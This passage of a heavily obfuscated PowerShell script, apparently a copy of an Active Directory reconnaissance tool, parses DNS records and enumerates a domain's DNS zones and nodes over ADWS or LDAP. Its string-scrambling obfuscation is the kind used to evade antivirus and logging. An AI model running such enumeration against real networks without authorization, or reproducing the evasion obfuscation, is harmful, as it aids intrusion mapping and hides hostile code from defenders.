                while ($SegmentLength-- -gt 0)
                {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS
    {
        
        $RDataType =  (VARiABle  ('9X'+'tHC') ).value::("{1}{0}" -f '16','ToUInt').Invoke($DNSRecord, 2)
        $UpdatedAtSerial =  (GCi ('VA'+'riA'+'BLe:9Xth'+'c') ).vAlue::("{2}{1}{0}" -f '2','Int3','ToU').Invoke($DNSRecord, 8)

        $TTLRaw = $DNSRecord[12..15]

        
        $Null =   $B1Kd::("{0}{1}{2}"-f 'Re','ve','rse').Invoke($TTLRaw)
        $TTL =  $9XTHc::("{1}{0}" -f'2','ToUInt3').Invoke($TTLRaw, 0)

        $Age =  $9XTHC::("{0}{2}{1}" -f'To','Int32','U').Invoke($DNSRecord, 20)
        If ($Age -ne 0)
        {
            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).("{2}{1}{0}" -f'ours','dH','Ad').Invoke($age)).("{1}{0}"-f'tring','ToS').Invoke()
        }
        Else
        {
            $TimeStamp = ("{0}{1}{2}"-f'[s','t','atic]')
        }

        $DNSRecordObject = New-Object ("{0}{2}{1}"-f'PSObj','ct','e')

        switch ($RDataType)
        {
            1
            {
                $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
                $Data = $IP
                $DNSRecordObject | Add-Member ("{3}{1}{0}{2}" -f 'ert','eprop','y','Not') ("{1}{0}{2}"-f'dT','Recor','ype') 'A'
            }

            2
            {
                $NSName = Get-Name $DNSRecord[24..$DNSRecord."L`eNg`Th"]
                $Data = $NSName
                $DNSRecordObject | Add-Member ("{0}{2}{1}" -f'N','eproperty','ot') ("{0}{2}{1}" -f'Recor','Type','d') 'NS'
            }

            5
            {
                $Alias = Get-Name $DNSRecord[24..$DNSRecord."l`ENg`Th"]
                $Data = $Alias
                $DNSRecordObject | Add-Member ("{3}{1}{0}{2}"-f'prop','e','erty','Not') ("{0}{1}{2}"-f 'Re','cordTyp','e') ("{1}{0}"-f'ME','CNA')
            }

            6
            {
                $PrimaryNS = Get-Name $DNSRecord[44..$DNSRecord."LEng`Th"]
                $ResponsibleParty = Get-Name $DNSRecord[$(46+$DNSRecord[44])..$DNSRecord."LEng`Th"]
                $SerialRaw = $DNSRecord[24..27]
                
                $Null =   ( GEt-ITem ('varIa'+'BLe'+':'+'b1K'+'D')  ).VALuE::("{0}{2}{1}" -f 'Rev','se','er').Invoke($SerialRaw)
                $Serial =  (Item ('vaRia'+'b'+'lE:9XthC') ).VAlUe::("{0}{1}" -f'ToUIn','t32').Invoke($SerialRaw, 0)

                $RefreshRaw = $DNSRecord[28..31]
                $Null =   (  geT-vaRiaBlE  ("B"+"1kD")  -VAlueoN)::("{0}{2}{1}"-f 'Reve','e','rs').Invoke($RefreshRaw)
                $Refresh =   ( GET-iTEM vARiABLe:9xtHc).VAlUE::("{1}{0}{2}" -f'oUInt3','T','2').Invoke($RefreshRaw, 0)

                $RetryRaw = $DNSRecord[32..35]
                $Null =   (  GET-vaRIaBle  b1KD  -valu)::("{1}{0}{2}" -f 'ers','Rev','e').Invoke($RetryRaw)
                $Retry =   (  variAbLE ('9Xth'+'c')  ).vAlUE::("{1}{0}" -f 'oUInt32','T').Invoke($RetryRaw, 0)

                $ExpiresRaw = $DNSRecord[36..39]
                $Null =  (Gi ("VAriAb"+"lE:"+"b1Kd")  ).VALue::("{2}{1}{0}"-f'erse','v','Re').Invoke($ExpiresRaw)
                $Expires =  $9xthc::("{2}{1}{0}"-f 't32','UIn','To').Invoke($ExpiresRaw, 0)

                $MinTTLRaw = $DNSRecord[40..43]
                $Null =   (gET-iTem  ('vArI'+'aBLe:b1k'+'D') ).VALUe::("{0}{1}" -f'Reve','rse').Invoke($MinTTLRaw)
                $MinTTL =   $9XtHC::("{2}{0}{1}"-f'UInt','32','To').Invoke($MinTTLRaw, 0)

                $Data = "[" + $Serial + "][" + $PrimaryNS + "][" + $ResponsibleParty + "][" + $Refresh + "][" + $Retry + "][" + $Expires + "][" + $MinTTL + "]"
                $DNSRecordObject | Add-Member ("{2}{0}{1}" -f'ropert','y','Notep') ("{1}{0}{2}" -f'dTyp','Recor','e') 'SOA'
            }

            12
            {
                $Ptr = Get-Name $DNSRecord[24..$DNSRecord."le`NGth"]
                $Data = $Ptr
                $DNSRecordObject | Add-Member ("{3}{2}{1}{0}" -f 'erty','op','epr','Not') ("{0}{1}{2}"-f'Rec','ordT','ype') 'PTR'
            }

            13
            {
                [string]$CPUType = ""
                [string]$OSType  = ""
                [int]$SegmentLength = $DNSRecord[24]
                $Index = 25
                while ($SegmentLength-- -gt 0)
                {
                    $CPUType += [char]$DNSRecord[$Index++]
                }
                $Index = 24 + $DNSRecord[24] + 1
                [int]$SegmentLength = $Index++
                while ($SegmentLength-- -gt 0)
                {
                    $OSType += [char]$DNSRecord[$Index++]
                }
                $Data = "[" + $CPUType + "][" + $OSType + "]"
                $DNSRecordObject | Add-Member ("{2}{0}{1}{3}" -f 'r','op','Notep','erty') ("{1}{3}{2}{0}"-f'pe','Recor','Ty','d') ("{1}{0}" -f 'NFO','HI')
            }

            15
            {
                $PriorityRaw = $DNSRecord[24..25]
                
                $Null =  ( GeT-VArIabLe  ('B'+'1KD')).vALUe::("{0}{1}{2}"-f 'Rev','ers','e').Invoke($PriorityRaw)
                $Priority =   (  gi  vARiaBle:9XTHC  ).vaLUe::("{1}{0}"-f '16','ToUInt').Invoke($PriorityRaw, 0)
                $MXHost   = Get-Name $DNSRecord[26..$DNSRecord."LEn`GTh"]
                $Data = "[" + $Priority + "][" + $MXHost + "]"
                $DNSRecordObject | Add-Member ("{1}{3}{2}{0}" -f 'operty','N','epr','ot') ("{0}{2}{1}"-f 'Re','ordType','c') 'MX'
            }

            16
            {
                [string]$TXT  = ''
                [int]$SegmentLength = $DNSRecord[24]
                $Index = 25
                while ($SegmentLength-- -gt 0)
                {
                    $TXT += [char]$DNSRecord[$Index++]
                }
                $Data = $TXT
                $DNSRecordObject | Add-Member ("{2}{1}{3}{0}"-f'erty','te','No','prop') ("{2}{0}{1}"-f'yp','e','RecordT') 'TXT'
            }

            28
            {
        		
                $AAAA = ""
                for ($i = 24; $i -lt 40; $i+=2)
                {
                    $BlockRaw = $DNSRecord[$i..$($i+1)]
                    
                    $Null =  ( geT-chIldITem vARIABle:B1kD  ).VALuE::("{2}{0}{1}"-f've','rse','Re').Invoke($BlockRaw)
                    $Block =  (  get-ItEm  ('VaR'+'IA'+'ble:'+'9xth'+'C')  ).vAlue::("{0}{2}{1}" -f'ToUIn','6','t1').Invoke($BlockRaw, 0)
			        $AAAA += ($Block).("{2}{1}{0}"-f'ing','r','ToSt').Invoke('x4')
			        If ($i -ne 38)
                    {
                        $AAAA += ':'
                    }
                }
                $Data = $AAAA
                $DNSRecordObject | Add-Member ("{0}{1}{2}" -f 'Not','epro','perty') ("{2}{0}{1}"-f'ord','Type','Rec') ("{1}{0}" -f'AAA','A')
            }

            33
            {
                $PriorityRaw = $DNSRecord[24..25]
                
                $Null =  (  vaRIABle B1kd -VALuEO  )::("{1}{0}{2}" -f 've','Re','rse').Invoke($PriorityRaw)
                $Priority =  (Get-VaRiaBlE ('9'+'XTHC')  ).VaLue::("{1}{0}" -f 'UInt16','To').Invoke($PriorityRaw, 0)

                $WeightRaw = $DNSRecord[26..27]
                $Null =  (  vaRIabLe ("B"+"1KD")).valuE::("{0}{1}"-f'R','everse').Invoke($WeightRaw)
                $Weight =   $9XthC::("{1}{0}{2}"-f 'In','ToU','t16').Invoke($WeightRaw, 0)

                $PortRaw = $DNSRecord[28..29]
                $Null =  $B1kD::("{0}{1}"-f 'Revers','e').Invoke($PortRaw)
                $Port =  ( vARiAbLE 9xthc -VA  )::("{2}{1}{0}" -f '16','Int','ToU').Invoke($PortRaw, 0)

                $SRVHost = Get-Name $DNSRecord[30..$DNSRecord."L`ENgth"]
                $Data = "[" + $Priority + "][" + $Weight + "][" + $Port + "][" + $SRVHost + "]"
                $DNSRecordObject | Add-Member ("{1}{0}{2}" -f 'rt','Noteprope','y') ("{1}{0}{2}"-f'yp','RecordT','e') 'SRV'
            }

            ("{1}{0}"-f'ault','def')
            {
                $Data = $(  (  get-varIaBlE y4p).vAlue::"TObA`sE6`4st`RING"($DNSRecord[24..$DNSRecord."Len`gTh"]))
                $DNSRecordObject | Add-Member ("{1}{2}{0}{3}"-f'p','Notepr','o','erty') ("{1}{0}{2}" -f'or','Rec','dType') ("{1}{0}"-f'KNOWN','UN')
            }
        }
        $DNSRecordObject | Add-Member ("{3}{1}{2}{0}"-f 'rty','ro','pe','Notep') ("{2}{0}{3}{1}" -f'tSeri','l','UpdatedA','a') $UpdatedAtSerial
        $DNSRecordObject | Add-Member ("{0}{1}{2}"-f'Notep','r','operty') 'TTL' $TTL
        $DNSRecordObject | Add-Member ("{2}{1}{3}{0}" -f 'y','er','Noteprop','t') 'Age' $Age
        $DNSRecordObject | Add-Member ("{1}{0}{3}{2}"-f'pro','Note','ty','per') ("{0}{2}{1}" -f 'TimeS','p','tam') $TimeStamp
        $DNSRecordObject | Add-Member ("{3}{2}{0}{1}" -f 'teprop','erty','o','N') ("{1}{0}" -f'ta','Da') $Data
        Return $DNSRecordObject
    }
}

Function g`et-aD`RDNsZ`One
{

    param(
        [Parameter(maNDAtORY = $true)]
        [string] $Method,

        [Parameter(MANdaTORy = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(maNdaTory = $false)]
        [string] $DomainController,

        [Parameter(MandaTOrY = $false)]
        [Management.Automation.PSCredential] $Credential =   $K49P::"eMP`TY",

        [Parameter(maNDatoRY = $true)]
        [int] $PageSize,

        [Parameter(mANdatory = $true)]
        [string] $ADROutputDir,

        [Parameter(mAndAToRY = $true)]
        [array] $OutputType,

        [Parameter(manDAToRy = $false)]
        [bool] $ADRDNSZones = $true,

        [Parameter(MANdaTOry = $false)]
        [bool] $ADRDNSRecords = $false
    )

    If ($Method -eq ("{0}{1}"-f'ADW','S'))
    {
        Try
        {
            $ADDNSZones = Get-ADObject -LDAPFilter ("{0}{2}{4}{3}{1}" -f'(','e)','objectCl','=dnsZon','ass') -Properties ("{0}{1}"-f 'Nam','e'),("{0}{1}{2}"-f 'whenCre','at','ed'),("{2}{0}{3}{1}"-f'n','ed','whe','Chang'),("{1}{0}{2}{3}"-f 'ncre','us','ate','d'),("{2}{0}{1}"-f'h','anged','usnc'),("{1}{0}{3}{2}"-f'stinguish','di','me','edna')
        }
        Catch
        {
            Write-Warning ("{1}{3}{11}{10}{15}{5}{4}{2}{6}{13}{0}{8}{7}{9}{12}{14}"-f 'ting','[Get-A','i','DRDN','ror wh','r','le e','bj',' dnsZone O','e','e','SZon','c','numera','ts','] E')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        $DNSZoneArray = @()
        If ($ADDNSZones)
        {
            $DNSZoneArray += $ADDNSZones
            Remove-Variable ("{2}{0}{1}" -f 'DNSZo','nes','AD')
        }

        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning ("{9}{4}{3}{0}{2}{8}{6}{5}{7}{1}"-f 'on','ext','e] Er','t-ADRDNSZ','e','tting Dom',' ge','ain Cont','ror','[G')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        Try
        {
            $ADDNSZones1 = Get-ADObject -LDAPFilter ("{0}{4}{1}{2}{3}"-f '(ob','Class=','dnsZone',')','ject') -SearchBase "DC=DomainDnsZones,$($ADDomain.DistinguishedName)" -Properties ("{0}{1}"-f 'Na','me'),("{0}{2}{3}{1}" -f 'w','d','henCreat','e'),("{1}{3}{0}{2}"-f 'an','when','ged','Ch'),("{1}{0}{2}"-f 'crea','usn','ted'),("{1}{0}{2}"-f'snch','u','anged'),("{2}{3}{1}{0}"-f'shedname','stingui','d','i')
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating DC=DomainDnsZones,$($ADDomain.DistinguishedName) dnsZone Objects "
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        If ($ADDNSZones1)
        {
            $DNSZoneArray += $ADDNSZones1
            Remove-Variable ("{2}{3}{0}{1}" -f'ones','1','AD','DNSZ')
        }

        Try
        {
            $ADDNSZones2 = Get-ADObject -LDAPFilter ("{3}{5}{2}{0}{1}{4}" -f 's','Zo','s=dn','(objectCla','ne)','s') -SearchBase "DC=ForestDnsZones,DC=$($ADDomain.Forest -replace '\.',',DC=')" -Properties ("{1}{0}" -f 'ame','N'),("{1}{0}{2}{3}" -f'enCre','wh','at','ed'),("{1}{0}{2}" -f 'henC','w','hanged'),("{2}{0}{1}" -f'sncrea','ted','u'),("{2}{1}{0}{3}"-f'g','han','usnc','ed'),("{3}{2}{1}{0}{4}" -f'm','edna','tinguish','dis','e')
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating DC=ForestDnsZones,DC=$($ADDomain.Forest -replace '\.',',DC=') dnsZone Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        If ($ADDNSZones2)
        {
            $DNSZoneArray += $ADDNSZones2
            Remove-Variable ("{1}{0}{2}" -f 'NSZone','ADD','s2')
        }

        If ($ADDomain)
        {
            Remove-Variable ("{0}{1}{2}" -f'AD','D','omain')
        }

        Write-Verbose "[*] Total DNS Zones: $([ADRecon.ADWSClass]::ObjectCount($DNSZoneArray)) "

        If ($DNSZoneArray)
        {
            $ADDNSZonesObj = @()
            $ADDNSNodesObj = @()
            $DNSZoneArray | ForEach-Object {
                
                $Obj = New-Object ("{2}{0}{1}"-f'SObjec','t','P')
                $Obj | Add-Member -MemberType ("{1}{0}{3}{2}"-f 'ote','N','rty','Prope') -Name ("{1}{0}"-f 'e','Nam') -Value $( (get-chilDITem ('v'+'a'+'riAB'+'lE:jwB18')  ).VALue::("{1}{2}{3}{0}" -f'ing','Clea','nSt','r').Invoke($_."Na`Me"))
                Try
                {
                    $DNSNodes = Get-ADObject -SearchBase $($_."dis`T`i`Ng`UiShEdNa`me") -LDAPFilter (("{5}{1}{4}{2}{3}{0}" -f 'de)','bjectClas','=dnsN','o','s','(o')) -Properties ("{4}{0}{3}{1}{2}"-f 'i','n','guishedName','sti','D'),("{1}{0}" -f'srecord','dn'),("{3}{4}{1}{0}{2}"-f'bs','m','toned','dNS','To'),("{1}{0}" -f'ame','N'),("{1}{4}{5}{3}{2}{0}"-f'ion','Pr','et','el','otectedFromA','ccidentalD'),("{1}{4}{0}{2}{3}" -f'a','show','ncedView','Only','InAdv'),("{1}{0}{2}" -f 'hen','w','Changed'),("{1}{3}{2}{0}" -f 'ed','whe','t','nCrea')
                }
                Catch
                {
                    Write-Warning "[Get-ADRDNSZone] Error while enumerating $($_.DistinguishedName) dnsNode Objects "
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
                If ($DNSNodes)
                {
                    $Obj | Add-Member -MemberType ("{1}{2}{3}{0}" -f'perty','NoteP','r','o') -Name ("{3}{2}{0}{1}" -f 'Cou','nt','d','Recor') -Value $($DNSNodes | Measure-Object | Select-Object -ExpandProperty ("{0}{1}"-f 'Co','unt'))
                    $DNSNodes | ForEach-Object {
                        $ObjNode = New-Object ("{2}{0}{1}"-f'ec','t','PSObj')
                        $ObjNode | Add-Member -MemberType ("{2}{0}{3}{1}"-f 'P','ty','Note','roper') -Name ("{0}{1}"-f'ZoneNa','me') -Value $Obj."N`Ame"
                        $ObjNode | Add-Member -MemberType ("{0}{2}{1}" -f 'Note','y','Propert') -Name ("{0}{1}"-f 'Na','me') -Value $_."nA`ME"
                        Try
                        {
                            $DNSRecord = Convert-DNSRecord $_."D`N`srEcord"[0]
                        }
                        Catch
                        {
                            Write-Warning ("{3}{2}{7}{0}{8}{4}{1}{6}{5}"-f'hile c','Reco','ne]','[Get-ADRDNSZo','ng the DNS','d','r',' Error w','onverti')
                            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                        }
                        $ObjNode | Add-Member -MemberType ("{3}{2}{1}{0}" -f'y','t','per','NotePro') -Name ("{1}{2}{0}" -f 'pe','RecordT','y') -Value $DNSRecord."r`e`C`ORDTyPE"
                        $ObjNode | Add-Member -MemberType ("{1}{0}{2}" -f 'otePr','N','operty') -Name ("{1}{0}"-f'a','Dat') -Value $DNSRecord."D`ATa"
                        $ObjNode | Add-Member -MemberType ("{2}{0}{1}" -f 'ePro','perty','Not') -Name ("{0}{1}"-f 'TT','L') -Value $DNSRecord."T`TL"
                        $ObjNode | Add-Member -MemberType ("{0}{2}{1}{3}" -f'N','o','otePr','perty') -Name ("{0}{1}" -f 'A','ge') -Value $DNSRecord."A`gE"
                        $ObjNode | Add-Member -MemberType ("{3}{0}{1}{2}" -f 'otePr','ope','rty','N') -Name ("{1}{2}{0}"-f 'tamp','T','imeS') -Value $DNSRecord."tiME`st`Amp"
                        $ObjNode | Add-Member -MemberType ("{0}{1}{2}"-f'Not','ePro','perty') -Name ("{1}{0}{3}{2}"-f'pdatedA','U','ial','tSer') -Value $DNSRecord."U`p`dA`TEd`ATSeRIAL"
                        $ObjNode | Add-Member -MemberType ("{2}{1}{3}{0}"-f 'perty','P','Note','ro') -Name ("{1}{2}{0}" -f'nCreated','w','he') -Value $_."wHeNc`R`eAtED"
                        $ObjNode | Add-Member -MemberType ("{2}{1}{0}{3}" -f'ePro','ot','N','perty') -Name ("{0}{1}{2}"-f 'w','he','nChanged') -Value $_."WHENCHa`N`GeD"
                        
                        
                        
                        $ObjNode | Add-Member -MemberType ("{2}{1}{0}" -f'y','Propert','Note') -Name ("{3}{5}{2}{1}{0}{4}" -f'nl','ViewO','owInAdvanced','s','y','h') -Value $_."SH`O`win`AdvANCE`DviEWON`lY"
                        $ObjNode | Add-Member -MemberType ("{0}{2}{3}{1}"-f 'Not','operty','eP','r') -Name ("{0}{1}{2}{3}" -f 'Dis','t','ing','uishedName') -Value $_."D`Is`T`IngUI`sHEDN`AMe"
                        $ADDNSNodesObj += $ObjNode
                        If ($DNSRecord)
                        {
                            Remove-Variable ("{1}{0}{2}" -f 'eco','DNSR','rd')
                        }
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType ("{2}{1}{0}" -f 'erty','rop','NoteP') -Name ("{1}{2}{0}{3}"-f'dCo','Rec','or','unt') -Value $null
                }
                $Obj | Add-Member -MemberType ("{3}{2}{1}{0}" -f'ty','er','teProp','No') -Name ("{2}{0}{1}{3}"-f 'NCre','ate','US','d') -Value $_."uSnC`REA`TED"
                $Obj | Add-Member -MemberType ("{0}{1}{2}" -f 'NoteP','roper','ty') -Name ("{1}{2}{0}"-f 'd','USNChang','e') -Value $_."US`NChA`NGeD"
                $Obj | Add-Member -MemberType ("{0}{2}{1}"-f 'N','y','otePropert') -Name ("{3}{0}{1}{2}"-f 'henCr','ea','ted','w') -Value $_."W`HeNcr`EATED"
                $Obj | Add-Member -MemberType ("{2}{1}{0}" -f 'operty','Pr','Note') -Name ("{2}{3}{1}{0}"-f 'd','nge','whenCh','a') -Value $_."w`HE`NC`HAnGeD"
                $Obj | Add-Member -MemberType ("{2}{1}{0}"-f'teProperty','o','N') -Name ("{4}{0}{2}{1}{3}"-f'stinguis','dN','he','ame','Di') -Value $_."di`st`InGU`ishE`dn`AmE"
                $ADDNSZonesObj += $Obj
            }
            Write-Verbose "[*] Total DNS Records: $([ADRecon.ADWSClass]::ObjectCount($ADDNSNodesObj)) "
            Remove-Variable ("{2}{1}{0}"-f'ray','SZoneAr','DN')
        }
    }

    If ($Method -eq ("{0}{1}" -f 'L','DAP'))
    {
        $objSearcher = New-Object ("{11}{3}{4}{10}{7}{6}{1}{0}{9}{8}{5}{2}"-f'rec','vices.Di','r','yst','em.D','he','r','ySe','orySearc','t','irector','S') $objDomain
        $ObjSearcher."PAG`esI`Ze" = $PageSize
        $ObjSearcher."prOPer`T`IEStoLoad".("{1}{2}{0}" -f 'ge','AddRa','n').Invoke((("{1}{0}" -f 'me','na'),("{0}{1}{2}" -f 'whencr','eate','d'),("{0}{1}{2}" -f 'wh','e','nchanged'),("{1}{2}{3}{0}"-f'ted','u','sncre','a'),("{2}{0}{1}" -f'hange','d','usnc'),("{0}{1}{2}{3}{4}"-f'disti','ngui','s','hednam','e')))
        $ObjSearcher."F`iL`TER" = (("{4}{0}{5}{2}{3}{1}" -f 'b','e)','ctClass=','dnsZon','(o','je'))
        $ObjSearcher."sE`ARC`hS`COPe" = ("{0}{1}"-f 'Su','btree')

        Try
        {
            $ADDNSZones = $ObjSearcher.("{0}{1}" -f'FindAl','l').Invoke()
        }
        Catch
        {
            Write-Warning ("{4}{1}{9}{6}{0}{5}{2}{7}{8}{10}{3}" -f 'o','A',' whil','ts','[Get-','r',' Err','e ','enumerati','DRDNSZone]','ng dnsZone Objec')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $ObjSearcher.("{0}{1}{2}" -f'dis','p','ose').Invoke()

        $DNSZoneArray = @()
        If ($ADDNSZones)
        {
            $DNSZoneArray += $ADDNSZones
            Remove-Variable ("{1}{2}{0}{3}" -f 'NSZ','A','DD','ones')
        }

        $SearchPath = ("{0}{3}{2}{1}"-f 'D','nes','mainDnsZo','C=Do')
        If ($Credential -ne  (varIABLe K49p  -VAl  )::"eM`PTy")
        {
            $objSearchPath = New-Object ("{4}{3}{7}{0}{6}{5}{2}{1}"-f'yServ','y','s.DirectoryEntr','ystem','S','e','ic','.Director') "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential."User`N`AmE",$Credential.("{3}{2}{1}{4}{5}{0}"-f 'ial','rkCre','etNetwo','G','de','nt').Invoke()."p`ASs`Word"
        }
        Else
        {
            $objSearchPath = New-Object ("{5}{1}{3}{7}{4}{6}{2}{0}"-f 'ntry','ys','rvices.DirectoryE','tem.D','o','S','rySe','irect') "LDAP://$($SearchPath),$($objDomain.distinguishedName)"
        }
        $objSearcherPath = New-Object ("{3}{6}{7}{2}{0}{5}{1}{4}"-f 'c','ry','vices.Dire','System.Dir','Searcher','to','ector','ySer') $objSearchPath
        $objSearcherPath."FiLt`Er" = ("{0}{3}{4}{1}{2}{5}" -f '(','on','e','objectCl','ass=dnsZ',')')
        $objSearcherPath."p`A`GEsizE" = $PageSize
        $objSearcherPath."pr`op`ERtIES`ToL`OAd".("{1}{0}" -f 'e','AddRang').Invoke((("{1}{0}"-f 'ame','n'),("{0}{1}{2}" -f 'wh','encreate','d'),("{2}{0}{1}" -f'ange','d','whench'),("{1}{3}{2}{0}"-f'd','u','e','sncreat'),("{2}{0}{1}" -f'hange','d','usnc'),("{3}{0}{1}{2}"-f'tinguished','n','ame','dis')))
        $objSearcherPath."S`Ea`RChSC`OpE" = ("{0}{1}"-f'Su','btree')

        Try
        {
            $ADDNSZones1 = $objSearcherPath.("{2}{0}{1}"-f'i','ndAll','F').Invoke()
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating $($SearchPath),$($objDomain.distinguishedName) dnsZone Objects. "
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $objSearcherPath.("{1}{2}{0}"-f 'se','di','spo').Invoke()

        If ($ADDNSZones1)
        {
            $DNSZoneArray += $ADDNSZones1
            Remove-Variable ("{0}{2}{1}" -f 'AD','s1','DNSZone')
        }

        $SearchPath = ("{0}{2}{1}{3}"-f'DC=Forest','Zon','Dns','es')
        If ($Credential -ne  ( VARIaBlE  K49P ).vaLue::"e`Mpty")
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain."DistiNG`UI`she`d`NamE")
            $DomainContext = New-Object ("{8}{1}{3}{7}{5}{0}{4}{6}{2}{9}" -f't','Di','ctoryCon','rectoryS','ory.','ices.ActiveDirec','Dire','erv','System.','text')(("{2}{1}{0}" -f'n','mai','Do'),$($DomainFQDN),$($Credential."US`eR`NAme"),$($Credential.("{3}{0}{1}{2}"-f 'ede','n','tial','GetNetworkCr').Invoke()."pA`S`SWord"))
            Try
            {
                $ADDomain =   (  gci ('vArIA'+'bl'+'e:'+'iHYJ'+'8Z')).VAluE::("{2}{1}{3}{0}" -f 'n','ma','GetDo','i').Invoke($DomainContext)
            }
            Catch
            {
                Write-Warning ("{4}{6}{5}{8}{2}{3}{7}{1}{0}" -f'xt','nte','tti','ng Domai','[Get-ADRFo','st] Error','re','n Co',' ge')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable ("{1}{2}{3}{0}"-f 'ext','D','oma','inCont')
            $objSearchPath = New-Object ("{4}{0}{2}{3}{5}{6}{1}{7}"-f'em.D','toryEntr','i','rectoryServices.Dir','Syst','e','c','y') "LDAP://$($DomainController)/$($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=')", $Credential."UsERn`A`ME",$Credential.("{3}{1}{0}{6}{4}{2}{5}" -f 'ork','etNetw','a','G','nti','l','Crede').Invoke()."pa`sSWorD"
        }
        Else
        {
            $ADDomain =  (  geT-vAriaBlE  ihyJ8z -vALUEOnlY)::("{2}{0}{1}{3}" -f 'rrentDom','ai','GetCu','n').Invoke()
            $objSearchPath = New-Object ("{2}{3}{1}{4}{5}{7}{0}{6}" -f 'yEn','e','System.Directory','S','rv','ic','try','es.Director') "LDAP://$($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=')"
        }

        $objSearcherPath = New-Object ("{6}{3}{5}{1}{0}{4}{7}{2}" -f 'ct','Dire','her','e','oryS','ctoryServices.','System.Dir','earc') $objSearchPath
        $objSearcherPath."fi`l`Ter" = ("{2}{0}{3}{1}{5}{4}{6}" -f'objec','lass','(','tC','Zone','=dns',')')
        $objSearcherPath."P`AgEsi`ZE" = $PageSize
        $objSearcherPath."prOperTi`E`SToLO`Ad".("{0}{1}{2}" -f'A','ddRa','nge').Invoke((("{0}{1}" -f 'na','me'),("{0}{2}{1}"-f'wh','created','en'),("{0}{1}{2}"-f'when','ch','anged'),("{1}{0}{2}" -f 's','u','ncreated'),("{3}{1}{2}{0}" -f'anged','s','nch','u'),("{4}{3}{2}{5}{1}{0}" -f 'ame','dn','u','ting','dis','ishe')))
        $objSearcherPath."s`Ea`RChsC`oPE" = ("{1}{2}{0}"-f 'tree','Su','b')

        Try
        {
            $ADDNSZones2 = $objSearcherPath.("{0}{1}"-f'Find','All').Invoke()
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating $($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=') dnsZone Objects."
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $objSearcherPath.("{0}{1}" -f 'disp','ose').Invoke()

        If ($ADDNSZones2)
        {
            $DNSZoneArray += $ADDNSZones2
            Remove-Variable ("{0}{2}{1}"-f 'AD','ones2','DNSZ')
        }

        If($ADDomain)
        {
            Remove-Variable ("{0}{1}{2}"-f'AD','Do','main')
        }

        Write-Verbose "[*] Total DNS Zones: $([ADRecon.LDAPClass]::ObjectCount($DNSZoneArray)) "

        If ($DNSZoneArray)
        {
            $ADDNSZonesObj = @()
            $ADDNSNodesObj = @()
            $DNSZoneArray | ForEach-Object {
                If ($Credential -ne  $k49P::"E`mPty")
                {
                    $objSearchPath = New-Object ("{2}{4}{6}{5}{3}{7}{0}{1}"-f 'ices.DirectoryEnt','ry','Syst','r','e','cto','m.Dire','yServ') "LDAP://$($DomainController)/$($_.Properties.distinguishedname)", $Credential."uSEr`N`AMe",$Credential.("{2}{0}{1}{3}" -f 'two','rkCreden','GetNe','tial').Invoke()."p`AsSw`ORD"
                }
                Else
                {
                    $objSearchPath = New-Object ("{6}{1}{9}{4}{5}{8}{10}{7}{3}{0}{2}"-f 'rectoryEntr','s','y','s.Di','em.D','irectory','Sy','e','Servi','t','c') "LDAP://$($_.Properties.distinguishedname)"
                }
                $objSearcherPath = New-Object ("{7}{2}{6}{5}{10}{11}{0}{3}{8}{9}{4}{1}" -f 'y','cher','r','Servic','ear','c','e','System.Di','es.Dire','ctoryS','t','or') $objSearchPath
                $objSearcherPath."Fi`LT`Er" = (("{4}{0}{1}{2}{5}{3}" -f 'ctClass=','d','n',')','(obje','sNode'))
                $objSearcherPath."p`AgeS`iZe" = $PageSize
                $objSearcherPath."pRoPErTieS`T`O`LoAd".("{1}{2}{0}"-f'e','Add','Rang').Invoke((("{0}{4}{2}{1}{3}{5}"-f 'd','ishe','tingu','dnam','is','e'),("{0}{2}{1}"-f 'dn','rd','sreco'),("{0}{1}"-f 'na','me'),"dc",("{4}{5}{2}{0}{3}{1}"-f'nadvance','only','wi','dview','s','ho'),("{3}{2}{1}{0}"-f'd','ge','henchan','w'),("{1}{2}{0}{3}" -f'a','wh','encre','ted')))
                Try
                {
                    $DNSNodes = $objSearcherPath.("{0}{1}" -f'Fin','dAll').Invoke()
                }
                Catch
                {
                    Write-Warning "[Get-ADRDNSZone] Error while enumerating $($_.Properties.distinguishedname) dnsNode Objects "
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
                $objSearcherPath.("{0}{1}"-f'dispo','se').Invoke()
                Remove-Variable ("{2}{0}{1}" -f'SearchPat','h','obj')

                
                $Obj = New-Object ("{2}{0}{1}" -f 'SOb','ject','P')
                $Obj | Add-Member -MemberType ("{0}{1}{2}"-f 'N','oteProp','erty') -Name ("{1}{0}"-f 'me','Na') -Value $(  $s07D::"C`lE`ANstri`NG"($_."pR`o`P`ertiES"."n`Ame"[0]))
                If ($DNSNodes)
                {
